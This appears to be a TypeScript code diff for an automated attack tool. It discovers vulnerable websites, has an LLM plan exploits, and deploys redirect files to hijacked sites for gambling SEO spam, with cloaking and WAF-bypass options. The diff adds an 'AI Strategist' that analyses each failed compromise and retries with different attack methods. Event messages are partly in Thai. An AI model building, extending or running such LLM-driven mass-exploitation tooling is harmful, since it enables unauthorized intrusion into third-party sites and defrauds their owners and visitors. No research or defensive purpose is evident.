@@ -24,6 +24,12 @@ import { runMassDiscovery, type DiscoveryConfig, type DiscoveredTarget } from ".
 import { startBackgroundJob, getJobStatus } from "./job-runner";
 import { sendTelegramNotification } from "./telegram-notifier";
 import { invokeLLM } from "./_core/llm";
+import {
+  orchestrateRetry,
+  ALL_ATTACK_METHODS,
+  type AttackAttemptRecord,
+  type TargetContext,
+} from "./ai-attack-strategist";
 
 // ═══════════════════════════════════════════════════════
 //  TYPES
@@ -40,6 +46,7 @@ export interface AgenticConfig {
   enableWafBypass?: boolean;
   enableAiExploit?: boolean;
   enableCloaking?: boolean;
+  maxRetriesPerTarget?: number;  // Max AI-powered retries per target (default 3)
 }
 
 export interface AgenticEvent {
@@ -459,7 +466,7 @@ async function runAgenticLoop(
         if (signal.aborted) return { target, success: false, reason: "stopped" };
         
         try {
-          return await attackSingleTarget(sessionId, target, config, redirectUrls, state, emitEvent);
+          return await attackSingleTarget(sessionId, target, config, redirectUrls, state, emitEvent, { totalAttacked: attackedCount, totalSucceeded: successCount, totalFailed: failCount });
         } catch (e: any) {
           return { target, success: false, reason: e.message };
         }
@@ -556,113 +563,232 @@ async function attackSingleTarget(
   redirectUrls: string[],
   state: AgenticState,
   emitEvent: (phase: string, detail: string, progress: number, data?: Record<string, unknown>) => Promise<void>,
+  sessionStats?: { totalAttacked: number; totalSucceeded: number; totalFailed: number },
 ): Promise<{ target: DiscoveredTarget; success: boolean; reason: string; deployId?: number; deployedUrls?: string[] }> {
   
-  // Pick a redirect URL for this target (rotation)
-  const redirectUrl = await pickRedirectUrl(redirectUrls);
-  
-  await emitEvent("attacking", `🎯 โจมตี ${target.domain} (CMS: ${target.cms || "unknown"}, Score: ${target.vulnScore})`, 0, {
-    domain: target.domain,
-    cms: target.cms,
-    vulnScore: target.vulnScore,
-    redirectUrl,
-  });
-  
-  // Phase 2: AI plans attack strategy
-  const strategy = await aiPlanAttackStrategy(target);
-  await emitEvent("attacking", `🧠 AI วางแผน: ${strategy.reasoning.substring(0, 100)}... (${strategy.estimatedSuccess}% chance)`, 0, {
-    domain: target.domain,
-    strategy: strategy.attackOrder,
-  });
-  
-  // Phase 3: Launch attack via background job (uses unified pipeline)
-  try {
-    const jobResult = await startBackgroundJob({
-      userId: config.userId,
-      targetDomain: target.url || `https://${target.domain}`,
-      redirectUrl,
-      mode: "emergent",
-      maxIterations: 5,
-      seoKeywords: config.seoKeywords || ["casino", "slot", "betting"],
-      enableCloaking: config.enableCloaking,
-      methodPriority: strategy.attackOrder.map(m => ({ id: m, enabled: true })),
-    });
-    
-    const deployId = jobResult.deployId;
-    
-    // Phase 4: Wait for job to complete (poll status)
-    const maxWaitMs = 5 * 60 * 1000; // 5 minutes max per target
-    const pollInterval = 5000; // 5 seconds
-    const startTime = Date.now();
-    
-    while (Date.now() - startTime < maxWaitMs) {
-      if (state.abortController.signal.aborted) {
-        return { target, success: false, reason: "stopped", deployId };
-      }
-      
-      await new Promise(resolve => setTimeout(resolve, pollInterval));
-      
-      const status = await getJobStatus(deployId);
-      if (!status) continue;
-      
-      if (status.status === "success") {
-        const verifiedUrls = (status.verifiedUrls as string[]) || [];
-        
-        // Update redirect stats
-        await updateRedirectStats(redirectUrl, true);
-        
-        // Update session stats
-        try {
-          const db = await getDb();
-          if (db) {
-            await db.update(agenticSessions)
-              .set({ totalRedirectsPlaced: sql`${agenticSessions.totalRedirectsPlaced} + ${verifiedUrls.length}` })
-              .where(eq(agenticSessions.id, sessionId));
-          }
-        } catch { /* best-effort */ }
-        
-        await emitEvent("success", `✅ ${target.domain} — สำเร็จ! ${verifiedUrls.length} files placed, redirect → ${redirectUrl}`, 0, {
-          domain: target.domain,
-          deployId,
-          verifiedUrls,
-          redirectUrl,
-        });
-        
-        return { target, success: true, reason: "verified", deployId, deployedUrls: verifiedUrls };
-      }
-      
-      if (status.status === "failed" || status.status === "partial") {
-        await updateRedirectStats(redirectUrl, false);
-        const phase = status.liveProgress?.phase || "unknown";
-        
-        await emitEvent("failed", `❌ ${target.domain} — ${status.status}: ${phase}`, 0, {
-          domain: target.domain,
-          deployId,
-          status: status.status,
-        });
-        
-        return { target, success: false, reason: status.status, deployId };
-      }
-      
-      // Still running — emit progress
-      if (status.liveProgress?.phase) {
-        await emitEvent("attacking", `⚔️ ${target.domain} — ${status.liveProgress.phase} (${status.liveProgress.progress || 0}%)`, 0, {
-          domain: target.domain,
-          deployId,
-          phase: status.liveProgress.phase,
-          progress: status.liveProgress.progress,
-        });
-      }
+  const maxRetries = config.maxRetriesPerTarget ?? 3;
+  const attemptHistory: AttackAttemptRecord[] = [];
+  let currentMethodPriority: string[] = [];
+
+  // ═══ RETRY LOOP — AI Strategist drives retries ═══
+  for (let attempt = 0; attempt <= maxRetries; attempt++) {
+    if (state.abortController.signal.aborted) {
+      return { target, success: false, reason: "stopped" };
     }
-    
-    // Timeout
-    await updateRedirectStats(redirectUrl, false);
-    return { target, success: false, reason: "timeout", deployId };
-    
-  } catch (e: any) {
-    await emitEvent("failed", `❌ ${target.domain} — Error: ${e.message}`, 0);
-    return { target, success: false, reason: e.message };
+
+    // ─── If this is a retry (attempt > 0), consult AI Strategist ───
+    if (attempt > 0) {
+      await emitEvent("ai_retry", `🧠 AI Strategist: วิเคราะห์ความล้มเหลวครั้งที่ ${attempt}/${maxRetries} สำหรับ ${target.domain}...`, 0, {
+        domain: target.domain,
+        attempt,
+        maxRetries,
+      });
+
+      const targetCtx: TargetContext = {
+        domain: target.domain,
+        cms: target.cms || null,
+        cmsVersion: target.cmsVersion || null,
+        serverType: target.serverType || null,
+        phpVersion: target.phpVersion || null,
+        wafDetected: target.waf || null,
+        wafStrength: null,
+        vulnScore: target.vulnScore,
+        hasOpenUpload: target.hasOpenUpload,
+        hasExposedConfig: target.hasExposedConfig,
+        hasExposedAdmin: target.hasExposedAdmin,
+        hasWritableDir: target.hasWritableDir,
+        hasVulnerableCms: target.hasVulnerableCms,
+        hasWeakAuth: target.hasWeakAuth,
+        knownCves: target.notes?.filter((n: string) => n.startsWith("CVE-")) || [],
+        previousAttempts: attemptHistory,
+      };
+
+      const retryResult = await orchestrateRetry(
+        targetCtx,
+        maxRetries,
+        {
+          totalTargets: sessionStats?.totalAttacked ?? 0,
+          remainingTargets: 0,
+          successRate: sessionStats?.totalSucceeded
+            ? Math.round((sessionStats.totalSucceeded / Math.max(sessionStats.totalAttacked, 1)) * 100)
+            : 0,
+          avgTimePerTarget: 0,
+        },
+        Array.from(ALL_ATTACK_METHODS),
+        (event) => {
+          emitEvent("ai_retry", `🤖 ${event.detail}`, 0, event.data).catch(() => {});
+        },
+      );
+
+      if (!retryResult.continueDecision.shouldContinue || !retryResult.strategy?.shouldRetry) {
+        await emitEvent("ai_skip", `⏹️ AI Strategist ตัดสินใจหยุดโจมตี ${target.domain}: ${retryResult.aiReasoning}`, 0, {
+          domain: target.domain,
+          reasoning: retryResult.aiReasoning,
+        });
+        return { target, success: false, reason: `AI stopped after ${attempt} retries: ${retryResult.aiReasoning}` };
+      }
+
+      // AI suggests a new method — reorder priority
+      const nextMethod = retryResult.strategy.nextMethod;
+      currentMethodPriority = [nextMethod, ...currentMethodPriority.filter((m: string) => m !== nextMethod)];
+
+      await emitEvent("ai_retry", `🎯 AI Strategist: ลองใหม่ด้วย ${nextMethod} (${retryResult.strategy.estimatedSuccessRate}% chance) — ${retryResult.strategy.reasoning}`, 0, {
+        domain: target.domain,
+        attempt: attempt + 1,
+        method: nextMethod,
+        estimatedSuccess: retryResult.strategy.estimatedSuccessRate,
+      });
+    }
+
+    // ─── Pick redirect URL ───
+    const redirectUrl = await pickRedirectUrl(redirectUrls);
+
+    if (attempt === 0) {
+      await emitEvent("attacking", `🎯 โจมตี ${target.domain} (CMS: ${target.cms || "unknown"}, Score: ${target.vulnScore})`, 0, {
+        domain: target.domain,
+        cms: target.cms,
+        vulnScore: target.vulnScore,
+        redirectUrl,
+      });
+    }
+
+    // ─── Plan strategy (first attempt uses AI planner, retries use strategist) ───
+    if (attempt === 0) {
+      const strategy = await aiPlanAttackStrategy(target);
+      currentMethodPriority = strategy.attackOrder;
+      await emitEvent("attacking", `🧠 AI วางแผน: ${strategy.reasoning.substring(0, 100)}... (${strategy.estimatedSuccess}% chance)`, 0, {
+        domain: target.domain,
+        strategy: strategy.attackOrder,
+      });
+    }
+
+    // ─── Launch attack ───
+    const attackStartTime = Date.now();
+    try {
+      const jobResult = await startBackgroundJob({
+        userId: config.userId,
+        targetDomain: target.url || `https://${target.domain}`,
+        redirectUrl,
+        mode: "emergent",
+        maxIterations: 5,
+        seoKeywords: config.seoKeywords || ["casino", "slot", "betting"],
+        enableCloaking: config.enableCloaking,
+        methodPriority: currentMethodPriority.map((m: string) => ({ id: m, enabled: true })),
+      });
+
+      const deployId = jobResult.deployId;
+      const maxWaitMs = 5 * 60 * 1000;
+      const pollInterval = 5000;
+      const startTime = Date.now();
+      let jobFinalStatus = "timeout";
+      let jobPhase = "unknown";
+      let jobResponseSnippet = "";
+
+      while (Date.now() - startTime < maxWaitMs) {
+        if (state.abortController.signal.aborted) {
+          return { target, success: false, reason: "stopped", deployId };
+        }
+
+        await new Promise(resolve => setTimeout(resolve, pollInterval));
+
+        const status = await getJobStatus(deployId);
+        if (!status) continue;
+
+        if (status.status === "success") {
+          const verifiedUrls = (status.verifiedUrls as string[]) || [];
+          await updateRedirectStats(redirectUrl, true);
+          try {
+            const db = await getDb();
+            if (db) {
+              await db.update(agenticSessions)
+                .set({ totalRedirectsPlaced: sql`${agenticSessions.totalRedirectsPlaced} + ${verifiedUrls.length}` })
+                .where(eq(agenticSessions.id, sessionId));
+            }
+          } catch { /* best-effort */ }
+
+          await emitEvent("success", `✅ ${target.domain} — สำเร็จ! ${verifiedUrls.length} files placed, redirect → ${redirectUrl}${attempt > 0 ? ` (retry #${attempt})` : ""}`, 0, {
+            domain: target.domain,
+            deployId,
+            verifiedUrls,
+            redirectUrl,
+            retryAttempt: attempt,
+          });
+
+          return { target, success: true, reason: "verified", deployId, deployedUrls: verifiedUrls };
+        }
+
+        if (status.status === "failed" || status.status === "partial") {
+          await updateRedirectStats(redirectUrl, false);
+          jobFinalStatus = status.status;
+          jobPhase = status.liveProgress?.phase || "unknown";
+          break; // Exit poll loop — will be retried by AI
+        }
+
+        if (status.liveProgress?.phase) {
+          await emitEvent("attacking", `⚔️ ${target.domain} — ${status.liveProgress.phase} (${status.liveProgress.progress || 0}%)${attempt > 0 ? ` [retry #${attempt}]` : ""}`, 0, {
+            domain: target.domain,
+            deployId,
+            phase: status.liveProgress.phase,
+            progress: status.liveProgress.progress,
+          });
+        }
+      }
+
+      // ═══ ATTACK FAILED — Record attempt for AI analysis ═══
+      const attackDuration = Date.now() - attackStartTime;
+      const attemptRecord: AttackAttemptRecord = {
+        attemptNumber: attempt + 1,
+        method: currentMethodPriority[0] || "unified_pipeline",
+        exploitType: "multi_step",
+        wafDetected: target.waf || null,
+        httpStatus: jobFinalStatus === "timeout" ? 408 : null,
+        responseSnippet: jobResponseSnippet,
+        errorMessage: `${jobFinalStatus}: ${jobPhase}`,
+        duration: attackDuration,
+        timestamp: Date.now(),
+      };
+      attemptHistory.push(attemptRecord);
+
+      if (attempt >= maxRetries) {
+        await emitEvent("failed", `❌ ${target.domain} — ล้มเหลวหลัง ${attempt + 1} ครั้ง (AI retries exhausted)`, 0, {
+          domain: target.domain,
+          deployId,
+          totalAttempts: attempt + 1,
+        });
+        return { target, success: false, reason: `failed after ${attempt + 1} attempts`, deployId };
+      }
+
+      await emitEvent("ai_retry", `🔄 ${target.domain} — ล้มเหลว (${jobFinalStatus}), AI Strategist กำลังวิเคราะห์...`, 0, {
+        domain: target.domain,
+        attempt,
+        status: jobFinalStatus,
+      });
+
+    } catch (e: any) {
+      const attackDuration = Date.now() - attackStartTime;
+      const attemptRecord: AttackAttemptRecord = {
+        attemptNumber: attempt + 1,
+        method: currentMethodPriority[0] || "unified_pipeline",
+        exploitType: "multi_step",
+        wafDetected: target.waf || null,
+        httpStatus: null,
+        responseSnippet: "",
+        errorMessage: e.message,
+        duration: attackDuration,
+        timestamp: Date.now(),
+      };
+      attemptHistory.push(attemptRecord);
+
+      if (attempt >= maxRetries) {
+        await emitEvent("failed", `❌ ${target.domain} — Error หลัง ${attempt + 1} ครั้ง: ${e.message}`, 0);
+        return { target, success: false, reason: e.message };
+      }
+
+      await emitEvent("ai_retry", `🔄 ${target.domain} — Error: ${e.message}, AI Strategist กำลังวิเคราะห์...`, 0);
+    }
   }
+
+  return { target, success: false, reason: "max retries exhausted" };
 }
 
 // ═══════════════════════════════════════════════════════
